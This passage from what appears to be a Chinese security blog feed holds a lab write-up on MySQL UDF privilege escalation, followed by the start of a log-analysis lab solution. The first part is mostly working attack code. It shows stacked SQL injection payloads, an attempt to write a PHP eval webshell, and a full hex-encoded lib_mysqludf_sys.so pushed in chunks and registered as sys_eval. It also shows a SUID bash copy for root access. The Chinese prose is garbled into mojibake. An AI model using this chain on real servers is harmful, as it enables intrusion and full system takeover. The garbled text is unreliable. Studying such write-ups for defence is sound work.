class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>); </span><br></pre></td></tr></table></figure><img src="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/IMG_20241126-145519780.png" class="">  <p>æˆåŠŸæ‹¿åˆ°rootæƒé™ã€<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;cp /bin/bash /tmp/lse; chmod +xs /tmp/lse&#x27;</span>);</span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„å‘½ä»¤æ˜¯å°†/bion/bashå¤åˆ¶åˆ°/tmp/lseå¹¶èµ‹äºˆSUIDæƒé™ã€‚è¿™æ ·å°±ä¼šå¯¼è‡´suidææƒ<br><img src="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/IMG_20241126-150407589.png" class=""><br>æˆ‘ä»¬æ‰§è¡Œ/tmp/lseå°±å¯ä»¥å¾—åˆ°rootæƒé™</p><h1 id="sqlæ³¨å…¥å¯¼è‡´çš„udfææƒ"><a href="#sqlæ³¨å…¥å¯¼è‡´çš„udfææƒ" class="headerlink" title="sqlæ³¨å…¥å¯¼è‡´çš„udfææƒ"></a>sqlæ³¨å…¥å¯¼è‡´çš„udfææƒ</h1><img src="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/IMG_20241126-151905881.png" class="">  <p>å‘ç°ä¸ºå †å æ³¨å…¥<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%secure_file_priv%&quot;;</span><br></pre></td></tr></table></figure><br><img src="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/IMG_20241126-152031961.png" class=""><br>å¯ä»¥å‘ç°æœªè®¾å®šå€¼å¯ä»¥å†™å…¥æ–‡ä»¶<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;%3bselect+&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fphp<span class="operator">+</span>eval($_POST[<span class="number">123</span>])<span class="operator">%</span><span class="number">3</span>bphpinfo()<span class="operator">%</span><span class="number">3</span>b<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="string">&#x27;+into+dumpfile+&#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><br>äº§å°è¯•ç›´æ¥å†™é©¬å¤±è´¥ã€‚webé¡µé¢åº”è¯¥æ²¡æœ‰å†™å…¥æƒé™</p><p>é‚£ä¹ˆæˆ‘ä»¬åªå¥½å†™å…¥udfæ–‡ä»¶äº†<br>æŸ¥çœ‹pluginè·¯å¾„<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;;show+variables+like+&quot;%25plugin%25&quot;%3b;--+</span><br></pre></td></tr></table></figure><br><img src="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/IMG_20241126-160032684.png" class="">  </p><p>å…ˆé€šè¿‡å¦‚ä¸‹å‘½ä»¤å°†udfå˜ä¸ºhexæ ¼å¼<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#x27;/home/kali/mysql_udf/mysql/linux/64/lib_mysqludf_sys.so&#x27;)) into outfile &#x27;/tmp/udf.txt&#x27;;</span><br></pre></td></tr></table></figure><br>ç„¶åæˆ‘ä»¬å°†16è¿›åˆ¶çš„udfæ–‡ä»¶åˆ†æ®µä¼ åˆ°é¶æœºé‡Œï¼Œè¿™æ˜¯å› ä¸ºudfä¼ å€¼æœ‰å­—ç¬¦æ•°ä¸Šçº¿<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%3bselect+&#x27;</span><span class="number">7</span>F454C4602010100000000000000000003003E0001000000D00C0000000000004000000000000000E8180000000000000000000040003800050040001A00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050E57464040000006412000000000000641200000000000064120000000000009C000000000000009C00000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002B0000001500000005000000280000001E000000000000000000000006000000000000000C00000000000000070000002A00000009000000210000000000000000000000270000000B0000002200000018000000240000000E00000000000000040000001D0000001600000000000000130000000000000000000000120000002300000010000000250000001A0000000F000000000000000000000000000000000000001B00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000A00000011000000000000000000000000000000000000000D0000002600000017000000000000000800000000000000000000000000000000000000000000001F0000001C0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119C4C93DA4400398046883140000001600000017000000190000001B0000001D0000002000000022000000000000002300000000000000240000002500000027000000290000002A00000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED871581CC1E2F7DEA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF36AC68AE3B9FD4A0AC73D1C525681B320B5911FEAB5FBE120000000000000000000000000000000000000000000000000000000003000900A00B0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000E0000000120000000000000000000000DE01000000000000790100001200000000000000000000007700000000000000BA0000001200000000000000000000003504000000000000F5000000120000000000000000000000C2010000000000009E010000120000000000000000000000D900000000000000FB000000120000000000000000000000050000000000000016000000220000000000000000000000FE00000000000000CF000000120000000000000000000000AD00000000000000880100001200000000000000000000008000000000000000AB010000120000000000000000000000250100000000000010010000120000000000000000000000DC00000000000000C7000000120000000000000000000000C200000000000000B5000000120000000000000000000000CC02000000000000ED000000120000000000000000000000E802000000000000E70000001200000000000000000000009B00000000000000C200000012000000000000000000000028000000000000008001000012000B007A100000000000006E000000000000007500000012000B00A70D00000000000001000000000000001000000012000C00781100000000000000000000000000003F01000012000B001A100000000000002D000000000000001F01000012000900A00B0000000000000000000000000000C30100001000F1FF881720000000000000000000000000009600000012000B00AB0D00000000000001000000000000007001000012000B0066100000000000001400000000000000CF0100001000F1FF981720000000000000000000000000005600000012000B00A50D00000000000001000000000000000201000012000B002E0F0000000000002900000000000000A301000012000B00F71000000000000041000000000000003900000012000B00A40D00000000000001000000000000003201000012000B00EA0F0000000000003000000000000000BC0100001000F1FF881720000000000000000000000000006500000012000B00A60D00000000000001000000000000002501000012000B00800F0000000000006A000000000000008500000012000B00A80D00000000000003000000000000001701000012000B00570F00000000000029000000000000005501000012000B0047100000000000001F00000000000000A900000012000B00AC0D0000000000009A000000000000008F01000012000B00E8100000000000000F00000000000000D700000012000B00460E000000000000E800000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F6765745F6465696E6974007379735F657865635F6465696E6974007379735F6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C00666F726B00737973636F6E66006D6D6170007374726E6370790077616974706964007379735F6576616C006D616C6C6F6300706F70656E007265616C6C6F630066676574730070636C6F7365007379735F6576616C5F696E697400737472637079007379735F657865635F696E6974007379735F7365745F696E6974007379735F6765745F696E6974006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F657865630073797374656D007379735F73657400736574656E76007379735F7365745F6465696E69740066726565007379735F67657400676574656E76006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100B20100001000000000000000751A690900000200D401000000000000801720000000000008000000000000008017200000000000D01620000000000006000000020000000000000000000000D81620000000000006000000030000000000000000000000E016200000000000060000000A00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000A00000000000000000000003817200000000000070000000B00000000000000000000004017200000000000070000000C00000000000000000000004817200000000000070000000D00000000000000000000005017200000000000070000000E00000000000000000000005817200000000000070000000F00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883EC08E827010000E8C2010000E88D0500004883C408C3FF35320B2000FF25340B20000F1F4000FF25320B20006800000000E9E0FFFFFFFF252A0B20006801000000E9D0FFFFFFFF25220B20006802000000E9C0FFFFFFFF251A0B20006803000000E9B0FFFFFFFF25120B20006804000000E9A0FFFFFFFF250A0B20006805000000E990FFFFFFFF25020B20006806000000E980FFFFFFFF25FA0A20006807000000E970FFFFFFFF25F20A20006808000000E960FFFFFFFF25EA0A20006809000000E950FFFFFFFF25E20A2000680A000000E940FFFFFFFF25DA0A2000680B000000E930FFFFFFFF25D20A2000680C000000E920FFFFFFFF25CA0A2000680D000000E910FFFFFFFF25C20A2000680E000000E900FFFFFFFF25BA0A2000680F000000E9F0FEFFFF00000000000000004883EC08488B05F50920004885C07402FFD04883C408C390909090909090909055803D900A2000004889E5415453756248833DD809200000740C488B3D6F0A2000E812FFFFFF488D05130820004C8D2504082000488B15650A20004C29E048C1F803488D58FF4839DA73200F1F440000488D4201488905450A200041FF14C4488B153A0A20004839DA72E5C605260A2000015B415CC9C3660F1F8400000000005548833DBF072000004889E57422488B05530920004885C07416488D3DA70720004989C3C941FFE30F1F840000000000C9C39090C3C3C3C331C0C3C341544883C9FF4989F455534883EC10488B4610488B3831C0F2AE48F7D1488D69FFE8B6FEFFFF83F80089C77C61754FBF1E000000E803FEFFFF488D70FF4531C94531C031FFB921000000BA07000000488D042E48F7D64821C6E8AEFEFFFF4883F8FF4889C37427498B4424104889EA4889DF488B30E852FEFFFFFFD3EB0CBA0100000031F6E802FEFFFF31C0EB05B8010000005A595B5D415CC34157BF00040000415641554531ED415455534889F34883EC1848894C24104C89442408E85AFDFFFFBF010000004989C6E84DFDFFFFC600004889C5488B4310488D356A030000488B38E814FEFFFF4989C7EB374C89F731C04883C9FF<span class="string">&#x27;+into+dumpfile+&#x27;</span><span class="operator">/</span>tmp<span class="operator">/</span><span class="number">2.</span>txt</span><br></pre></td></tr></table></figure><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;%3bselect+&#x27;</span>F2AE4889EF48F7D1488D59FF4D8D641D004C89E6E8DDFDFFFF4A8D3C284889DA4C89F64D89E54889C5E8A8FDFFFF4C89FABE080000004C89F7E818FDFFFF4885C075B44C89FFE82BFDFFFF807D0000750A488B442408C60001EB1F42C6442DFF0031C04883C9FF4889EFF2AE488B44241048F7D148FFC94889084883C4184889E85B5D415C415D415E415FC34883EC08833E014889D7750B488B460831D2833800740E488D353A020000E817FDFFFFB20188D05EC34883EC08833E014889D7750B488B460831D2833800740E488D3511020000E8EEFCFFFFB20188D05FC3554889FD534889D34883EC08833E027409488D3519020000EB3F488B46088338007409488D3526020000EB2DC7400400000000488B4618488B384883C70248037808E801FCFFFF31D24885C0488945107511488D351F0200004889DFE887FCFFFFB20141585B88D05DC34883EC08833E014889F94889D77510488B46088338007507C6010131C0EB0E488D3576010000E853FCFFFFB0014159C34154488D35EF0100004989CC4889D7534889D34883EC08E832FCFFFF49C704241E0000004889D8415A5B415CC34883EC0831C0833E004889D7740E488D35D5010000E807FCFFFFB001415BC34883EC08488B4610488B38E862FBFFFF5A4898C34883EC28488B46184C8B4F104989F2488B08488B46104C89CF488B004D8D4409014889C6F3A44C89C7498B4218488B0041C6040100498B4210498B5218488B4008488B4A08BA010000004889C6F3A44C89C64C89CF498B4218488B400841C6040000E867FBFFFF4883C4284898C3488B7F104885FF7405E912FBFFFFC3554889CD534C89C34883EC08488B4610488B38E849FBFFFF4885C04889C27505C60301EB1531C04883C9FF4889D7F2AE48F7D148FFC948894D00595B4889D05DC39090909090909090554889E5534883EC08488B05C80320004883F8FF7419488D1DBB0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E86FFBFFFF4883C408C345787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D657465720045787065637465642065786163746C792074776F20617267756D656E747300457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E34004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F290000011B033B980000001200000040FBFFFFB400000041FBFFFFCC00000042FBFFFFE400000043FBFFFFFC00000044FBFFFF1401000047FBFFFF2C01000048FBFFFF44010000E2FBFFFF6C010000CAFCFFFFA4010000F3FCFFFFBC0100001CFDFFFFD401000086FDFFFFF4010000B6FDFFFF0C020000E3FDFFFF2C02000002FEFFFF4402000016FEFFFF5C02000084FEFFFF7402000093FEFFFF8C0200001400000000000000017A5200017810011B0C070890010000140000001C00000084FAFFFF01000000000000000000000014000000340000006DFAFFFF010000000000000000000000140000004C00000056FAFFFF01000000000000000000000014000000640000003FFAFFFF010000000000000000000000140000007C00000028FAFFFF030000000000000000000000140000009400000013FAFFFF01000000000000000000000024000000AC000000FCF9FFFF9A00000000420E108C02480E18410E20440E3083048603000000000034000000D40000006EFAFFFFE800000000420E10470E18420E208D048E038F02450E28410E30410E38830786068C05470E50000000000000140000000C0100001EFBFFFF2900000000440E100000000014000000240100002FFBFFFF2900000000440E10000000001C0000003C01000040FBFFFF6A00000000410E108602440E188303470E200000140000005C0100008AFBFFFF3000000000440E10000000001C00000074010000A2FBFFFF2D00000000420E108C024E0E188303470E2000001400000094010000AFFBFFFF1F00000000440E100000000014000000AC010000B6FBFFFF1400000000440E100000000014000000C4010000B2FBFFFF6E00000000440E300000000014000000DC01000008FCFFFF0F00000000000000000000001C000000F4010000FFFBFFFF4100000000410E108602440E188303470E2000000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF000000000000000000000000000000000100000000000000B2010000000000000C00000000000000A00B0000000000000D00000000000000781100000000000004000000000000005801000000000000F5FEFF6F00000000A00200000000000005000000000000006807000000000000060000000000000060030000000000000A00000000000000E0010000000000000B0000000000000018000000000000000300000000000000E81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200A0000000000000700000000000000C0090000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000A009000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000004809000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000CE0B000000000000DE0B000000000000EE0B000000000000FE0B0000000000000E<span class="string">&#x27;+into+dumpfile+&#x27;</span><span class="operator">/</span>tmp<span class="operator">/</span><span class="number">3.</span>txt<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%3bselect+&#x27;</span><span class="number">0</span>C0000000000001E0C0000000000002E0C0000000000003E0C0000000000004E0C0000000000005E0C0000000000006E0C0000000000007E0C0000000000008E0C0000000000009E0C000000000000AE0C000000000000BE0C0000000000008017200000000000004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200002E7368737472746162002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E64796E616D6963002E676F74002E676F742E706C74002E64617461002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000B000000F6FFFF6F0200000000000000A002000000000000A002000000000000C000000000000000030000000000000008000000000000000000000000000000150000000B00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001D00000003000000020000000000000068070000000000006807000000000000E00100000000000000000000000000000100000000000000000000000000000025000000FFFFFF6F020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000FEFFFF6F0200000000000000A009000000000000A009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000C009000000000000C00900000000000060000000000000000300000000000000080000000000000018000000000000004B000000040000000200000000000000200A000000000000200A0000000000008001000000000000030000000A0000000800000000000000180000000000000055000000010000000600000000000000A00B000000000000A00B000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000B80B000000000000B80B00000000000010010000000000000000000000000000040000000000000010000000000000005B000000010000000600000000000000D00C000000000000D00C000000000000A80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000E000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000DD000000000000000000000000000000010000000000000001000000000000006F000000010000000200000000000000641200000000000064120000000000009C000000000000000000000000000000040000000000000000000000000000007D000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008E000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009A000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000A3000000010000000300000000000000D016200000000000D0160000000000001800000000000000000000000000000008000000000000000800000000000000A8000000010000000300000000000000E816200000000000E8160000000000009800000000000000000000000000000008000000000000000800000000000000B1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000B7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000BC000000010000000000000000000000000000000000000088170000000000009B000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000C500000000000000000000000000000001000000000000000000000000000000<span class="string">&#x27;+into+dumpfile+&#x27;</span><span class="operator">/</span>tmp<span class="operator">/</span><span class="number">4.</span>txt<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><br><img src="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/IMG_20241126-155308596.png" class="">  </p><p>ç„¶åå°†å…¶æ‹¼èµ·æ¥æ”¾åˆ°/usr/lib/mariadb/pluginä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> unhex(concat(load_file(<span class="string">&#x27;/tmp/2.txt&#x27;</span>),load_file(<span class="string">&#x27;/tmp/3.txt&#x27;</span>),load_file(<span class="string">&#x27;/tmp/4.txt&#x27;</span>))) <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/mariadb/plugin/eval.so&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;;create+function+sys_eval+returns+string+soname+&#x27;</span>eval.so<span class="string">&#x27;;--+</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=select+sys_eval(&quot;whoami&quot;);</span><br></pre></td></tr></table></figure><img src="/2024/11/25/mysql-udf%E6%8F%90%E6%9D%83/IMG_20241126-160705496.png" class="">  <p>å½“ç„¶è¿™é¢˜å¾—åˆ°çš„æ˜¯mysqlæƒé™å¦‚æœè¯¥mysqlæ˜¯rootæƒé™å…è®¸å¾—åˆ°çš„å°±æ˜¯rootæƒé™</p><h1 id="å½“mysqlå¼±å¯†ç å¤–è”"><a href="#å½“mysqlå¼±å¯†ç å¤–è”" class="headerlink" title="å½“mysqlå¼±å¯†ç å¤–è”"></a>å½“mysqlå¼±å¯†ç å¤–è”</h1><p>ä¸sqlæ³¨å…¥ç›¸ä¼¼ä¸å¤šæ</p>]]></content>
      
      
      <categories>
          
          <category> top10 </category>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> ææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç„æœºé¶åœºç¬¬äºŒç« æ—¥å¿—åˆ†æ</title>
      <link href="/2024/11/25/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2024/11/25/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬äºŒç« æ—¥å¿—åˆ†æ-apacheæ—¥å¿—åˆ†æ"><a href="#ç¬¬äºŒç« æ—¥å¿—åˆ†æ-apacheæ—¥å¿—åˆ†æ" class="headerlink" title="ç¬¬äºŒç« æ—¥å¿—åˆ†æ-apacheæ—¥å¿—åˆ†æ"></a>ç¬¬äºŒç« æ—¥å¿—åˆ†æ-apacheæ—¥å¿—åˆ†æ</h1><h2 id="1ã€æäº¤å½“å¤©è®¿é—®æ¬¡æ•°æœ€å¤šçš„IPï¼Œå³é»‘å®¢IPï¼š"><a href="#1ã€æäº¤å½“å¤©è®¿é—®æ¬¡æ•°æœ€å¤šçš„IPï¼Œå³é»‘å®¢IPï¼š" class="headerlink" title="1ã€æäº¤å½“å¤©è®¿é—®æ¬¡æ•°æœ€å¤šçš„IPï¼Œå³é»‘å®¢IPï¼š"></a>1ã€æäº¤å½“å¤©è®¿é—®æ¬¡æ•°æœ€å¤šçš„IPï¼Œå³é»‘å®¢IPï¼š</h2><p>apacheçš„æ—¥å¿—ipæ˜¯åœ¨ç¬¬ä¸€ä¸ªæˆ‘ä»¬ç›´æ¥åˆ†ç»„è¾“å‡ºç¬¬ä¸€ä¸ªç»„å°±æ˜¯ipè®©ååœ¨ç»Ÿè®¡æ¬¡æ•°å³å¯<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat access.log.1|awk &#x27;&#123;print$1&#125;&#x27;|sort -n|uniq -c</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="/2024/11/25/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/IMG_20241125-121228733.png" class="">  </p><p>flag{192.168.200.2}</p><h2 id="2ã€é»‘å®¢ä½¿ç”¨çš„æµè§ˆå™¨æŒ‡çº¹æ˜¯ä»€ä¹ˆï¼Œæäº¤æŒ‡çº¹çš„md5ï¼š"><a href="#2ã€é»‘å®¢ä½¿ç”¨çš„æµè§ˆå™¨æŒ‡çº¹æ˜¯ä»€ä¹ˆï¼Œæäº¤æŒ‡çº¹çš„md5ï¼š" class="headerlink" title="2ã€é»‘å®¢ä½¿ç”¨çš„æµè§ˆå™¨æŒ‡çº¹æ˜¯ä»€ä¹ˆï¼Œæäº¤æŒ‡çº¹çš„md5ï¼š"></a>2ã€é»‘å®¢ä½¿ç”¨çš„æµè§ˆå™¨æŒ‡çº¹æ˜¯ä»€ä¹ˆï¼Œæäº¤æŒ‡çº¹çš„md5ï¼š</h2><p>ç›´æ¥è¿‡æ»¤å‡ºé»‘å®¢ipç„¶åå°†uaå¤´è¿›è¡Œmd5åŠ å¯†å³å¯<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access.log.1|grep &quot;192.168.200.2&quot;</span><br></pre></td></tr></table></figure><br><img src="/2024/11/25/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/IMG_20241125-112920614.png" class="">  </p><img src="/2024/11/25/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/IMG_20241125-120129568.png" class="">  <h2 id="3ã€æŸ¥çœ‹index-phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°ï¼Œæäº¤æ¬¡æ•°ï¼š"><a href="#3ã€æŸ¥çœ‹index-phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°ï¼Œæäº¤æ¬¡æ•°ï¼š" class="headerlink" title="3ã€æŸ¥çœ‹index.phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°ï¼Œæäº¤æ¬¡æ•°ï¼š"></a>3ã€æŸ¥çœ‹index.phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°ï¼Œæäº¤æ¬¡æ•°ï¼š</h2><p>è¿‡æ»¤/index.php<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access.log.1|grep &quot;/index.php&quot;|awk &#x27;&#123;print$1&#125;&#x27;|sort -n|uniq -c</span><br></pre></td></tr></table></figure><br><img src="/2024/11/25/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/IMG_20241125-120854275.png" class="">  </p><h2 id="4ã€æŸ¥çœ‹é»‘å®¢IPè®¿é—®äº†å¤šå°‘æ¬¡ï¼Œæäº¤æ¬¡æ•°ï¼šl"><a href="#4ã€æŸ¥çœ‹é»‘å®¢IPè®¿é—®äº†å¤šå°‘æ¬¡ï¼Œæäº¤æ¬¡æ•°ï¼šl" class="headerlink" title="4ã€æŸ¥çœ‹é»‘å®¢IPè®¿é—®äº†å¤šå°‘æ¬¡ï¼Œæäº¤æ¬¡æ•°ï¼šl"></a>4ã€æŸ¥çœ‹é»‘å®¢IPè®¿é—®äº†å¤šå°‘æ¬¡ï¼Œæäº¤æ¬¡æ•°ï¼šl</h2><p>ç¬¬ä¸€é¢˜å°±å‡ºäº†<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access.log.1|awk &#x27;&#123;print$1&#125;&#x27;|sort -n|uniq -c</span><br></pre></td></tr></table></figure><br>ä¹Ÿå¯ä»¥åœ¨åŠ ä¸€ä¸ªè¿‡æ»¤<br><img src="/2024/11/25/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/IMG_20241125-120558519.png" class="">  </p><p>flag{6555}</p><h2 id="5ã€æŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼Œæäº¤æ¬¡æ•°"><a href="#5ã€æŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼Œæäº¤æ¬¡æ•°" class="headerlink" title="5ã€æŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼Œæäº¤æ¬¡æ•°:"></a>5ã€æŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼Œæäº¤æ¬¡æ•°:</h2><p>è¿‡æ»¤æ—¶é—´åˆ°å°æ—¶<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access.log.1|grep -a &#x27;03/Aug/2023:08&#x27;|awk &#x27;&#123;print$1&#125;&#x27;|sort -n |uniq -c</span><br></pre></td></tr></table></figure></p><img src="/2024/11/25/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/IMG_20241125-120625692.png" class="">  <p>flag{5}</p><h1 id="msql"><a href="#msql" class="headerlink" title="msql"></a>msql</h1><h1 id="1-é»‘å®¢ç¬¬ä¸€æ¬¡å†™å…¥çš„shell"><a href="#1-é»‘å®¢ç¬¬ä¸€æ¬¡å†™å…¥çš„shell" class="headerlink" 